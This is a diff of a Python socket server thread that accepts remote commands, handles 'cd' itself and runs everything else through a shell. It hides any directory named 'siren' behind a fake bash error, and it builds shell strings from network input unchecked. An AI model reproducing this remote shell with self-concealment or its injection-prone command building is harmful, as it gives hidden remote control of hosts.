@@ -24,11 +24,12 @@ class telnetClientThread(threading.Thread):
             try:
                 cmd = self.conn.recv(256)
                 print(cmd)
-                if cmd == "TERMINATE":
+                cmdlist = cmd.split(" ")
+                if cmdlist[0] == "TERMINATE":
                     print("Session closed")
                     return
-                if cmd[:2] == "cd":
-                    if cmd[3:] == "..":
+                if cmdlist[0] == "cd":
+                    if cmdlist[1] == "..":
                         pathlist = path.split("/")
                         pathlist = pathlist[1:]
                         if len(pathlist) > 1:
@@ -40,29 +41,27 @@ class telnetClientThread(threading.Thread):
                         if path[0] != "/":
                             path = "/" + path
                         self.conn.send(path + ";")
-                    elif cmd[3:] == ".":
+                    elif cmdlist[1] == ".":
                         self.conn.send(path + ";")
                     else:
-                        if cmd[3] == '/':
-                            if os.path.isdir(cmd[3:]):
-                                if "siren" not in cmd[3:]:
-                                    path = cmd[3:]
+                        if cmdlist[1][0] == '/':
+                            if os.path.isdir(cmdlist[1]):
+                                if "siren" not in cmdlist[1]:
+                                    path = cmdlist[1]
                                     self.conn.send(path + ";")
                                 else:
-                                    self.conn.send(path + ";" + "bash: cd: " + cmd[3:] + ": No such file or directory")
+                                    self.conn.send(path + ";" + "bash: cd: " + cmdlist[1] + ": No such file or directory")
                             else:
-                                self.conn.send("bash: cd: " + cmd[3:] + ": No such file or directory")
+                                self.conn.send("bash: cd: " + cmdlist[1] + ": No such file or directory")
                         else:
-                            if os.path.isdir(path + "/" + cmd[3:]):
-                                if "siren" not in cmd[3:]:
-                                    path = path + "/" + cmd[3:]
+                            if os.path.isdir(path + "/" + cmdlist[1]):
+                                if "siren" not in cmdlist[1]:
+                                    path = path + "/" + cmdlist[1]
                                     self.conn.send(path + ";")
                                 else:
-                                    self.conn.send(path + ";" + "bash: cd: " + cmd[3:] + ": No such file or directory")
+                                    self.conn.send(path + ";" + "bash: cd: " + cmdlist[1] + ": No such file or directory")
                             else:
-                                self.conn.send(path + ";" + "bash: cd: " + cmd[3:] + ": No such file or directory")
-                if cmd == "pwd":
-                    self.conn.send(path + ";" + path)
+                                self.conn.send(path + ";" + "bash: cd: " + cmdlist[1] + ": No such file or directory")
                 else:
                     proc = Popen("(cd " + path + " && " + cmd + ")", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
                     cmdout = path + ";" + proc.stdout.read()
